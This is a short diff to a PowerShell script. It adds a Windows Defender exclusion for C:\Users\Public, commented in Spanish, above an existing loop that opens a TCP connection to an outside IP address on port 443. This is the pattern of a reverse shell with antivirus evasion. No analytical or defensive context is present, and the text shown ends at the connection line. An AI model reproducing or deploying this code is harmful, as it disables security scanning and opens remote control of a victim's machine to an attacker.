@@ -1,3 +1,6 @@
+# Excluir la ruta completa
+Add-MpPreference -ExclusionPath "C:\Users\Public"
+
 while ($true) {
     try {
         $client = New-Object System.Net.Sockets.TCPClient("200.28.162.248",443)
